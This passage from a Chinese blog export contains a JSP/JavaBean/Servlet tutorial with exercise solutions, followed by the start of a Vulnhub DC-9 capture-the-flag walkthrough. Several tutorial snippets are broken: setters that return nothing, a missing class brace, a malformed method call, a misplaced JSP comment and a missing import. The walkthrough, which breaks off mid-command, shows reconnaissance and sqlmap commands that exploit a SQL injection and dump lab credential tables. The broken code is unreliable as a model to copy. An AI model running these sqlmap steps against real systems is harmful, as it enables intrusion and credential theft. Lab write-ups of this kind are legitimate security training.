/>\n功能：将参数名称为propertyname的值提交给同JavaBean属性名称同名的属性。并自动实现数据类型转换\n\n3.将单个属性与输入参数间接关联\n<jsp:setProperty name=\"beanname\" property=\"propertyname\" param=\"bookName\" />\n功能：将请求参数名称为paramname的值给JavaBean的propertyname属性设置属性值。\n\n\n4.将所有的属性与请求参数关联\n<jsp:setProperty name=\"beanname\" property=\"*\" />\n功能：将提交页面中表单输入域所提供的输入值提交到JavaBean对象中相同名称的属性中。\n```\n\n#### `<jsp:getProperty>`\n\n显示JavaBean属性值，需要使用`<jsp:getProperty>`动作标签。\n\n**功能：**获取JavaBean对象指定属性的值，并显示在页面上。\n\n  **声明格式：**\n\n```java\n<jsp:getProperty  property=\"propertyname\"name=\"beanname\"/>\n```\n\n  **使用说明：**\n\n1、propertyname代表JavaBean的属性名；\n\n2、beanname代表JavaBean对象名，对应`<jsp:useBean>`标记的id属性\n\n3、通过JavaBean中的get方法获取对应属性的值。\n\n### 实例🌰\n\n> `题目：`设计Web程序，计算任意两个整数的和值，并在网页上显示结果。\n\n#### 1.使用脚本代码\n\n`input.jsp`\n\n```html\n<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head> <title>input.jsp提交任意2个整数的页面</title> </head>  \n  <body>\n  <h3> 按下列格式要求，输入两个整数：</h3><br>\n   <form action=\"show.jsp\" method=\"post\">\n         加数：<input name=\"shuju1\"><br><br>\n         被加数：<input name=\"shuju2\"><br><br>\n         <input type=submit value=\"提交\">\n   </form>\n  </body>\n</html>\n```\n\n`show.jsp`\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<html>\n  <head>  <title>利用JSP求两数和</title> </head>  \n  <body> \n     <% int shuju1 = Integer.parseInt(request.getParameter(\"shuju1\"));\n        int shuju2 = Integer.parseInt(request.getParameter(\"shuju2\"));\n     %>\n      <p>调用request获取数据并计算和显示：<br>\n       <%=shuju1%>+<%=shuju2%>= <%=shuju1+shuju2%><br>\n     </p>\n  </body>\n</html>\n```\n\n#### 2.使用Javabean\n\n网页input.jsp提交任意两个整数，而网页show.jsp获取两个数值后创建JavaBean对象，并调用求和方法获得和值，然后显示计算结果。\n\n![](https://img.jwt1399.top//img/20200611194413.png)\n\n`input.jsp`\n\n```html\n<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>\n<html>\n  <head> <title>input.jsp提交任意2个整数的页面</title> </head>  \n  <body>\n  <h3> 按下列格式要求，输入两个整数：</h3><br>\n   <form action=\"show.jsp\" method=\"post\">\n         加数：<input name=\"shuju1\"><br><br>\n         被加数：<input name=\"shuju2\"><br><br>\n         <input type=submit value=\"提交\">\n   </form>\n  </body>\n</html>\n```\n\n`Add.java`\n\n```java\npackage beans; //JavaBean必须放在一个用户命名的包下\n\npublic class Add {\n\tprivate  int shuju1 ;\n\tprivate  int shuju2 ;\n\t\n\tpublic Add() {\n\t\tsuper();\n\t}\n\tpublic Add(int shuju1, int shuju2) {\n\t\tsuper();\n\t\tthis.shuju1 = shuju1;\n\t\tthis.shuju2 = shuju2;\n\t}\n\tpublic int getShuju1() {\n\t\treturn shuju1;\n\t}\n\tpublic int setShuju1(int shuju1) {\n\t\tthis.shuju1 = shuju1;\n\t}\n\tpublic int getShuju2() {\n\t\treturn shuju2;\n\t}\n\tpublic int setShuju2(int shuju2) {\n\t\tthis.shuju2 = shuju2;\n\t}\n\tpublic int sum(){\n        return shuju1+shuju2;\n    }\n\n```\n\n`show.jsp`\n\n```html\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n    pageEncoding=\"UTF-8\"%>\n<%@ page import=\"beans.Add\"  %> <%--导入包--%>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>利用JSP求两数和</title>\n</head>\n<% request.setCharacterEncoding(\"UTF-8\"); %> <%--解决中文乱码--%>\n<body>\n<jsp:useBean  id=\"add\" class=\"beans.Add\" scope=\"request\"/>\n\n<jsp:setProperty property=\"shuju1\" name=\"add\"/>\n<jsp:setProperty property=\"shuju2\" name=\"add\"/>\n\n<jsp:getProperty property=\"shuju1\" name=\"add\"/>+\n<jsp:getProperty property=\"shuju2\" name=\"add\"/>=<%=add.sum%>\n```\n\n## JSP&JavaBean实例练习\n\n### 目的\n\n- 1．掌握常用JSP动作元素的使用；\n\n- 2．掌握常用内置对象的使用；\n\n- 3．掌握JavaBean的创建和使用；\n\n- 4．掌握使用JSP动作指令设置bean属性的几种方式；\n\n- 5．掌握在多个JSP页面中共享JavaBean。\n\n### 题目\n\n**新建一个Web工程，设计如图1所示register.jsp注册程序，要求用户填写姓名、性别、出生年月、民族、个人介绍等信息，提交注册后在另一个jsp页面中显示用户信息，如图2所示。**\n\n>（1）  创建CSS样式文件，采用链接方式；\n>（2）  编写**output1.jsp**，使用request内置对象分别获取各项注册信息并显示。\n>（3）  编写JavaBean用户封装注册信息，并编写**output2.jsp**，使用`<jsp:setProperty>`和`<jsp:getProperty>`获取注册信息并显示。\n\n| register.jsp显示效果                                    | output.jsp输出显示效果                                  |\n| ------------------------------------------------------- | ------------------------------------------------------- |\n| ![图1](https://img.jwt1399.top//img/20200817103449.jpg) | ![图2](https://img.jwt1399.top//img/20200817103446.png) |\n\n### 解答\n\n#### register.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n\t<meta charset=\"UTF-8\">\n\t<title>用户注册</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/styles.css\">\n  </head>\n    \n  <body>\n    <form action=\"output2.jsp\" name=\"regForm\" method=\"post\">\n      <table border=\"0\" align=\"center\" width=\"600\">\n        <tr> <td colspan=\"3\" height=\"50\" > <p id=\"title\">用户注册</p></td></tr>\n        <tr> \n          <td width=\"150\" height=\"50\"  class=\"c1\">用户名:</td>\n          <td   width=\"200\"  ><input id=\"userName\" type=\"text\" name=\"userName\" value=\"\" placeholder=\"张三\" required/></td>\n          <td   class=\"c3\" ><span>用户名不能为空！</span></td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">性别:</td>\n          <td><input type=\"radio\" name=\"userSex\" value=\"男\" checked style=\"width:30px;\"/>男\n          &nbsp;<input type=\"radio\" name=\"userSex\" value=\"女\" style=\"width:30px;\"/>女</td>\n          <td class=\"c3\">请选择你的性别！</td>\n        </tr>\n         \n        <tr> \n          <td class=\"c1\" height=\"50\">出生年月:</td>\n          <td><input type=\"date\" name=\"userBirthday\" value=\"\" /></td>\n          <td class=\"c3\">请选择你的出生日期！</td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">民族:</td>\n          <td><select name=\"userNation\" style=\"width:80px;\">\n          \t\t\t<option value=\"汉族\">汉族</option>\n                    <option value=\"壮族\">壮族</option>\n                    <option value=\"苗族\">苗族</option>\n                    <option value=\"回族\">回族</option>\n              </select>\n          </td>\n          <td class=\"c3\">请选择你的民族！</td>\n        </tr>\n        <tr> \n          <td class=\"c1\" height=\"50\">个人介绍:</td>\n          <td colspan=\"2\"><textarea cols=\"50\" rows=\"5\" name=\"userInfo\">我是一名单纯的大学生。。。</textarea></td>\n        </tr>\n        <tr>         \n          <td colspan=\"3\" align=\"center\" height=\"40\">\n            <input type=\"submit\" value=\"注册\" style=\"width:80px;\"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n            <input type=\"reset\" value=\"重置\" style=\"width:80px;\"/>\n          </td>\n        </tr>\n      </table>    \n    </form>\n  </body>\n</html>\n```\n\n#### style.css\n\n```css\nbody{\n\tfont-size:18px;\n\tcolor:red;\n\t}\n#title{\n\tcolor:#F00;\n\tfont-size:24px;\n\tfont-weight:bolder;\n\ttext-align:center;\n\t}\n.c1{\n\ttext-align:right;\n\t} \n.c3{\n\tcolor:blue; \n\tfont-size:15px;\n\t}\n input{\n\twidth:200px;\n \t}\ninput:hover{\n\tbackground-color:#00F;\n\t}\ninput:focus{\n\tbackground-color:#ccc;\n\t}\n#userName{\n\tbackground-image: url(../images/name.gif);\n\tbackground-repeat: no-repeat;\n\tbackground-position: 5px;\n\tpadding-left: 25px;\n\tborder: 1px solid #ccc;\n }\n```\n\n#### output1.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%-- <%@ page import=\"beans.Student\" %> --%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>My JSP 'output.jsp' starting page</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n  </head>\n  \n  <body>\n  \t<%  request.setCharacterEncoding(\"UTF-8\");<%--解决中文乱码--%>\n\t\tString userName = request.getParameter(\"userName\");\n\t\tString userSex = request.getParameter(\"userSex\");\n\t\tString userBirthday = request.getParameter(\"userBirthday\");\n\t\tString userNation = request.getParameter(\"userNation\");\n\t\tString userInfo = request.getParameter(\"userInfo\");\n\t%>\n\n    <table border=\"0\" align=\"center\" width=\"400\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">姓名：</td>\n    \t\t<td><%=userName %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">性别：</td>\n    \t\t<td><%=userSex %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">生日：</td>\n    \t\t<td><%=userBirthday %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">民族：</td>\n    \t\t<td><%=userNation %></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\" valign=\"top\">个人介绍：</td>\n    \t\t<td height=\"100\" valign=\"top\"><%=userInfo %></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n\n```\n\n#### User.java\n\n```java\npackage beans;\n\npublic class User {\n\tprivate String userName;\n\tprivate String userSex;\n\tprivate String userBirthday;\n\tprivate String userNation;\n\tprivate String userInfo;\n\t\n\tpublic User(){\n\t\t\n\t}\n\t\n\tpublic User(String userName, String userSex, String userBirthday,\n\t\t\tString userNation, String userInfo) {\n\t\tsuper();\n\t\tthis.userName = userName;\n\t\tthis.userSex = userSex;\n\t\tthis.userBirthday = userBirthday;\n\t\tthis.userNation = userNation;\n\t\tthis.userInfo = userInfo;\n\t}\n\t\n\t\n\tpublic void setUserName(String userName) {\n\t\tthis.userName = userName;\n\t}\n\t\n\tpublic void setUserSex(String userSex) {\n\t\tthis.userSex = userSex;\n\t}\n\t\n\tpublic void setUserBirthday(String userBirthday) {\n\t\tthis.userBirthday = userBirthday;\n\t}\n\t\n\tpublic void setUserNation(String userNation) {\n\t\tthis.userNation = userNation;\n\t}\n\t\n\tpublic void setUserInfo(String userInfo) {\n\t\tthis.userInfo = userInfo;\n\t}\n\t\n\tpublic String getUserName() {\n\t\treturn userName;\n\t}\n\tpublic String getUserSex(){\n\t\treturn userSex;\n\t}\n\tpublic String getUserBirthday() {\n\t\treturn userBirthday;\n\t}\n\tpublic String getUserNation() {\n\t\treturn userNation;\n\t}\n\tpublic String getUserInfo() {\n\t\treturn userInfo;\n\t}\n}\n\n```\n\n#### output2.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>\n<%@ page import=\"beans.User\" %>\n<%\n\tString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>Output</title>\n\t<meta http-equiv=\"pragma\" content=\"no-cache\">\n\t<meta http-equiv=\"cache-control\" content=\"no-cache\">\n\t<meta http-equiv=\"expires\" content=\"0\">    \n\t<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">\n\t<meta http-equiv=\"description\" content=\"This is my page\">\n  </head>\n  \n  <body>\n  \t<% request.setCharacterEncoding(\"UTF-8\"); %>\n  \t<jsp:useBean id=\"user\" class=\"beans.User\" scope=\"request\"/>\n  \t<jsp:setProperty name=\"user\" property=\"*\"/>\n\n    <table border=\"0\" align=\"center\" width=\"400\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">姓名：</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userName\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">性别：</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userSex\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">生日：</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userBirthday\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\">民族：</td>\n    \t\t<td><jsp:getProperty name=\"user\" property=\"userNation\"/></td>\n    \t</tr>\n    \t<tr>\n    \t\t<td width=\"100\" align=\"right\" valign=\"top\">个人介绍：</td>\n    \t\t<td height=\"100\" valign=\"top\"><jsp:getProperty name=\"user\" property=\"userInfo\"/></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n```\n\n## Servlet技术\n\n在Web应用程序开发中，一般由JSP技术、JavaBean技术和Servlet技术的结合实现MVC开发模式。\n\n   在MVC开发模式中，将Web程序的组件分为3部分：视图、控制、业务，分别由JSP、Servlet和JavaBean实现。\n\n### Servlet生命周期\n\n> Servlet作为一种在Servlet容器中运行的组件，必然有一个从创建到销毁的过程，这个过程称为Servlet的生命周期。\n\nServlet的生命周期可以划分为以下几个阶段：\n\n1.加载和实例化\n\n2.初始化\n\n3.响应请求\n\n4.服务终止\n\n![](https://img.jwt1399.top//img/20200614193513.png)\n\n### Servlet基本结构\n\n![](https://img.jwt1399.top//img/20200614193738.png)\n\n**说明：**\n\n①Servlet类需要继承类HttpServlet\n\n②Servlet的父类HttpServlet中包含了几个重要方法，根据需要重写它们：\n\n- init()：初始化方法，Servlet对象创建后，接着执行该方法。\n\n- doGet()：当请求类型是\"get\"时，调用该方法。\n\n- doPost()：当请求类型是\"post\"时，调用该方法。\n\n- service()：Servlet处理请求时自动执行service()方法，该方法根据请求的类型（get或post），调用doGet()或doPost()方法，因此，在建立Servlet时，一般只需要重写doGet()和doPost()方法。\n\n- destroy()：Servlet对象注销时自动执行。\n\n### Servlet建立步骤\n\n**Step1：**建立Web工程\n\n**Step2：**建立Servlet\n\n- ①在项目src下创建。\n\n- ②重写Servlet的doGet或doPost方法。\n\n- ③修改web.xml配置文件，注册所设计的Servlet。\n\n**Step3：**部署并运行Servlet\n\n### Servlet配置\n\n由于客户端是通过URL地址访问web服务器中的资源，所以Servlet程序若想被外界访问，必须把servlet程序映射到一个URL地址上，这个工作在web.xml文件中使用`<servlet>`元素和`<servlet-mapping>`元素完成。\n\n#### `<servlet>`元素\n\n用于注册Servlet，它包含有两个主要的子元素：`<servlet-name>`和`<servlet-class>`，分别用于设置Servlet的注册名称和Servlet的完整类名。\n\n```html\n<servlet>    \n    <servlet-name>LoginCheckServlet</servlet-name>\n    <servlet-class>servlets.LoginCheckServlet</servlet-class>\n  </servlet>\n```\n\n#### `<servlet-mapping>`元素\n\n用于映射一个已注册的Servlet的一个对外访问路径，它包含有两个子元素：`<servlet-name>`和`<url-pattern>`，分别用于指定Servlet的注册名称和Servlet的对外访问路径。\n\n```html\n<servlet-mapping>\n    <servlet-name>LoginCheckServlet</servlet-name>\n    <url-pattern>/loginCheck</url-pattern>\n  </servlet-mapping>\n```\n\n注意：\n\n1、一个`<servlet>`可以对应多个`<serlvet-mapping>`,从而一个Servlet可以有多个路径来访问\n\n2、url-partten中的路径也可以使用*通配符，但是只能有两种固定的格式：一种格式是“*.扩展名”，另一种格式是以正斜杠（/）开头并以“/*”结尾。\n\n## Servlet实例练习\n\n### 目的\n\n- 1．掌握servlet的创建、配置和访问；\n\n- 2．理解servlet的基本结构、常用方法、执行过程和生命周期；\n\n- 3．掌握servlet中使用JSP内置对象和JavaBean； \n\n- 4．掌握JSP与servlet的数据共享和关联关系。\n\n### 题目\n\n**新建一个Web工程，设计实现任意两个实数四则运算（加减乘除）的Web应用程序，要求使用MVC（Model-View-Controller）设计模式。具体地，使用JavaBean封装数据和四则运算方法（Model，业务），用户通过JSP页面输入计算参数（View，视图）后提交给Servlet程序处理（Controller，流程控制），如果用户输入数据不完整（如只输入一个）则跳转到原JSP输入页面，并以文本形式提示用户填写完整，否则Servlet使用JavaBean对数据进行处理后跳转到JSP页面使用JavaBean相关的jsp动作指令显示计算结果**\n\n> （1）  编写`input.jsp`，提供用户输入入口，如图1所示；\n> （2）  编写`Calculator.java`, 该JavaBean类封装操作数和四则运算方法，\n> （3）  编写`CalcServlet.java`，该Servlet接收用户提交的数据之后，当使用除法运算时，检验除数是否为0，若为0跳转到input.jsp，提醒用户除数不能为0，如图2所示；否则，使用JavaBean对象运算和封装数据，然后跳转到输出页面显示；\n> （4）  编写`output.jsp`，接收Servlet的数据，并使用JavaBean相关动作指令获得和显示计算结果，如图3所示。\n\n| input.jsp显示效果              | ![图1](https://img.jwt1399.top//img/20200817123551.jpg) |\n| ------------------------------ | ------------------------------------------------------- |\n| **除数为0时input.jsp显示效果** | ![图2](https://img.jwt1399.top//img/20200817123610.jpg) |\n| **output.jsp显示计算结果**     | ![图3](https://img.jwt1399.top//img/20200817123617.jpg) |\n\n### 解答\n\n#### input.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE HTML>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">\n    <title>计算器</title>\n\t<style type=\"text/css\">\n\t\tdiv{\n\t\t\twidth:80%;\n\t\t\theight:32px;\n\t\t\tmargin:0 auto;\n\t\t\tpadding-left:20px;\n\t\t\tborder:2px solid gray;\n\t\t\tfont-size:18px;\n\t\t\ttext-align:center;\n\t\t}\n\t</style>\n  </head>\n  \n  <body>\n    <div>\n    \t<form name=\"clcForm\" action=\"calcservlet\" method=\"post\">\n\t    \t操作数：<input type=\"number\" name=\"number1\" min=\"-100\" max=\"100\"/> &nbsp;&nbsp;\n\t    \t操作符：<select name=\"oper\">\n\t    \t\t\t\t\t<option>+</option>\n\t    \t\t\t\t\t<option>-</option>\n\t    \t\t\t\t\t<option>*</option>\n\t    \t\t\t\t\t<option selected>/</option>\n\t    \t\t\t</select> &nbsp;&nbsp;\n\t    \t操作数：<input type=\"number\" name=\"number2\" min=\"-100\" max=\"100\"/>&nbsp;&nbsp;&nbsp;&nbsp;\n\t    \t<input type=\"submit\" value=\"计算\" />&nbsp;&nbsp;\n\t    \t<input type=\"reset\" value=\"重置\"/>\n    \t</form>\n    </div>\n    <%String info = (String)request.getAttribute(\"info\");\n     if(info!=null){\n    %>\n    <div style=\"color:red;border:none;\"><%=info %></div>\n    <%} %>\n  </body>\n</html>\n```\n\n#### Calculator.java\n\n```java\npackage beans;\n\npublic class Calculator {\n\tprivate double number1;\n\tprivate double number2;\n\tprivate String oper;\n\t\n\tprivate double result;\n\t\n\tpublic Calculator() {\n\t\tsuper();\n\t}\n\t\n\t\n\tpublic Calculator(double number1, double number2, String oper) {\n\t\tsuper();\n\t\tthis.number1 = number1;\n\t\tthis.number2 = number2;\n\t\tthis.oper = oper;\n\t}\n\tpublic double getResult() {\n\t\tswitch (oper.charAt(0)) {\n\t\tcase '+': result = number1 + number2; \n\t\t\tbreak;\n\t\tcase '-': result = number1 - number2; \n\t\t\tbreak;\n\t\tcase '*': result = number1 * number2; \n\t\t\tbreak;\n\t\tcase '/': result = number1 / number2; \n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t\treturn result;\n\t}\n\t/*public void setResult(double result) {\n\t\tthis.result = result;\n\t}*/\n\t\n\tpublic double getNumber1() {\n\t\treturn number1;\n\t}\n\tpublic void setNumber1(double number1) {\n\t\tthis.number1 = number1;\n\t}\n\tpublic double getNumber2() {\n\t\treturn number2;\n\t}\n\tpublic void setNumber2(double number2) {\n\t\tthis.number2 = number2;\n\t}\n\tpublic String getOper() {\n\t\treturn oper;\n\t}\n\tpublic void setOper(String oper) {\n\t\tthis.oper = oper;\n\t}\n\t\n}\n```\n\n#### CalcServlet.java\n\n```java\npackage servlets;\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport beans.Calculator;\n@WebServlet(\"/CalcServlet\")\npublic class CalcServlet extends HttpServlet {\n\n\t/**\n\t * Constructor of the object.\n\t */\n\tpublic CalcServlet() {\n\t\tsuper();\n\t}\n\n\t/**\n\t * Destruction of the servlet. <br>\n\t */\n\tpublic void destroy() {\n\t\tsuper.destroy(); // Just puts \"destroy\" string in log\n\t\t// Put your code here\n\t}\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\n\t\tdoPost(request, response);\n\t}\n\n\tpublic void doPost(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\t\n\t\trequest.setCharacterEncoding(\"UTF-8\");\n\t\tString str1 = request.getParameter(\"number1\").trim();\n\t\tString str2 = request.getParameter(\"number2\").trim();\n\t\tString oper = request.getParameter(\"oper\");\n\t\t\n\t\tif(\"\".equals(str1)||\"\".equals(str2)){//不是 str1==null||str2==null\n\t\t\trequest.setAttribute(\"info\", \"请输入两个操作数！\");\n\t\t\trequest.getRequestDispatcher(\"/input.jsp\").forward(request, response);\n\t\t}\n\t\t\n\t\tdouble number1 = Double.parseDouble(str1);\n\t\tdouble number2 = Double.parseDouble(str2);\n\t\t\n\t\tif(\"/\".equals(oper)&&number2==0){\n\t\t\trequest.setAttribute(\"info\", \"除数不能为0！\");\n\t\t\trequest.getRequestDispatcher(\"/input.jsp\").forward(request, response);\n\t\t}\n\t\t\n\t\tCalculator calculator = new Calculator(number1,number2,oper);\n\t\trequest.setAttribute(\"calc\", calculator);\n\t\trequest.getRequestDispatcher(\"/output.jsp\").forward(request, response);\n\t}\n\n\tpublic void init() throws ServletException {\n\t\t// Put your code here\n\t}\n\n}\n```\n\n#### output.jsp\n\n```html\n<%@ page language=\"java\" import=\"java.util.*,beans.Calculator\" pageEncoding=\"UTF-8\"%>\n<%\nString path = request.getContextPath();\nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";\n%>\n\n<!DOCTYPE HTML>\n<html>\n  <head>\n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'output.jsp' starting page</title>\n  </head>\n  \n  <body>\n  <jsp:useBean id=\"calc\" class=\"beans.Calculator\" scope=\"request\"></jsp:useBean>\n  <%-- <jsp:setProperty property=\"*\" name=\"calc\"/> --%>\n  \n  <table border=\"0\" align=\"center\" width=\"600\">\n    \t<tr>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"number1\"/></td>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"oper\"/></td>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"number2\"/></td>\n    \t\t<td width=\"100\" align=\"center\">=</td>\n    \t\t<td width=\"100\" align=\"center\"><jsp:getProperty name=\"calc\" property=\"result\"/></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n```\n\n\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["JSP"],"categories":["JavaWeb"]},{"title":"Vulnhub靶机：DC-9","url":"/posts/55886.html","content":"\n## DC-9简介\n\n**靶机下载地址：**https://download.vulnhub.com/dc/DC-9.zip\n\n**靶机描述：**DC-9 是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。这一挑战的最终目标是获得root，并阅读唯一的flag。\n\n**涉及漏洞：**SQL注入、LFI\n\n**攻击机：**Kali/192.168.0.104\n\n## 一、信息收集\n\n### 1.探测目标\n\n```bash\n$ sudo arp-scan -l\n或者\n$ sudo netdiscover -i eth0\n```\n\n![](https://i.loli.net/2020/05/24/Xhv9srF4p3K6QTt.png)\n\n### 2.查看目标开放端口\n\n```bash\n$ sudo nmap -sV -p 0-6553 192.168.0.105\n```\n\n![](https://i.loli.net/2020/05/24/iGFDpYN6uMvnHq1.png)\n\n目标靶机开放了80端口,22端口显示被过滤掉了\n\n#### 3.查看网页相关信息\n\n使用浏览器插件`Wappalyzer`，这个插件可以检测网站的CMS，框架，服务器等信息，\n\n![](https://i.loli.net/2020/05/24/qOPklaIWVLFtiTC.png)\n\n但是没有检测到CMS信息\n\n## 二、漏洞查找与利用\n\n### 1.SQL注入\n\n在页面发现一个search框，可以查询用户信息，与数据库有交互，猜测可能存在SQL注入，随便输入数据查询，URL框没有改变，说明是POST方式提交，Burp抓包检测是否存在SQL注入的可能\n\n![](https://i.loli.net/2020/05/24/7JsYehVuf9Wqj6g.png)\n\n可以看出确实存在POST型SQL注入，网站应该对注入做了一些应对措施。过滤啊，屏蔽报错啊\n\n居然存在注入，话不多说，直接上SQLmap跑\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" --dbs\n\navailable databases [3]:\n[*] information_schema\n[*] Staff\n[*] users\n\n--data:指定的数据会被作为POST数据提交\n```\n\n发现Staff和users数据库，先看看users库中有什么\n\n**users数据库**\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D users --tables\n\nDatabase: users\n[1 table]\n+-------------+\n| UserDetails |\n+-------------+\n```\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D users -T UserDetails --dump\n\nDatabase: users\nTable: UserDetails\n[17 entries]\n+----+------------+---------------+---------------------+-----------+-----------+\n| id | lastname   | password      | reg_date            | username  | firstname |\n+----+------------+---------------+---------------------+-----------+-----------+\n| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |\n| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |\n| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |\n| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |\n| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |\n| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |\n| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |\n| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |\n| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |\n| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |\n| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |\n| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |\n| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |\n| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |\n| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |\n| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |\n| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |\n+----+------------+---------------+---------------------+-----------+-----------+\n```\n\n这里是那些员工这账号和密码，后面可能会用到，先放着，然后我们再看看Staff库里面有啥\n\n**Staff数据库**\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D Staff --tables\n\nDatabase: Staff\n[2 tables]\n+--------------+\n| StaffDetails |\n| Users        |\n+--------------+\n```\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D Staff -T StaffDetails --dump\n```\n\n![](https://i.loli.net/2020/05/24/1ATcKngtzZLsf2Y.png)\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data 